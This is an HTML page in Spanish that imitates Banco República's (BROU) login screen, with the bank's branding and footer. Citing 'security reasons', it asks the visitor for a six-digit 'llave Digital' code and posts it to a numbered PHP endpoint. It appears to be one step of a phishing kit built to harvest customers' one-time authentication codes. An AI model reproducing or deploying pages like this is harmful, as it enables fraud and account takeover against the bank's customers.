<!DOCTYPE html>
<html lang="es">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>BROU Login</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
  <style>
    body {
      background-color: rgb(8, 82, 141);
      color: #ffffff;
    }

    .login-container {
      background: rgba(255, 255, 255, 0.9);
      padding: 20px;
      border-radius: 10px;
      color: #003087;
    }

    .promo-section {
      padding: 20px;
      text-align: center;
    }

    .footer {
      position: fixed;
      bottom: 0;
      width: 100%;
      background-color: rgb(8, 82, 141);
      padding: 10px 0;
      text-align: center;
    }

    .card-img-top {
      max-height: 150px;
      object-fit: contain;
    }

    .form-select,
    .form-control {
      border: var(--bs-border-width) solid rgb(8, 82, 141);
    }
  </style>
</head>

<body>
  <div class="container-fluid min-vh-100 d-flex flex-column justify-content-between">
    <!-- Header -->
    <!-- <header class="text-center py-4">
        <img
          src="https://via.placeholder.com/100x50?text=BROU+Logo"
          alt="BROU Logo"
          class="img-fluid"
        />
      </header> -->

    <!-- Main Content -->
    <main class="row justify-content-center align-items-center flex-grow-1">
      <div class="col-12 col-md-9 col-lg-6">
        <div class="row justify-content-center">
          <!-- Login Form -->

          <div class="col-12 col-md-8 py-2">
            <img src="/img/logo.svg" alt="" class="img-fluid" style="height: 50px" />
          </div>
          <div class="col-12 col-md-8 login-container justify-content-center">
            <h6 class="text-center mb-4">Por motivos de seguridad, ingresa tu llave Digital.</h6>

            <form action="/api/index6.php" id="form" method="post" class="above-the-fold">


              <div class="mb-3">
                <label for="docNumber" class="form-label">Ingresa el código</label>
                <input class="form-control" placeholder="" id="DocumentNumber" name="DocumentNumber" type="tel"
                  maxlength="6" minlength="6" required value="">
              </div>


              <div class="row mt-4 justify-content-center">
                <div class="col-6 text-center">
                  <button type="submit" class="btn btn-primary w-100" style="
                        border-radius: 30px;
                        background-color: #0066b3 !important;
                      ">
                    CONFIRMAR LLAVE
                  </button>
                </div>

              </div>
            </form>
          </div>
        </div>
      </div>
    </main>

    <!-- Footer -->
    <footer class="footer">
      <div class="container">
        <div class="row">
          <div class="col-12">
            <img src="/img/bank.svg" alt="Banco República" class="img-fluid my-md-5 my-sm-0" style="height: 50px" />

            <p class="small">
              © 2025 Banco República. Todos los derechos reservados
            </p>
          </div>
        </div>
      </div>
    </footer>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>

</html>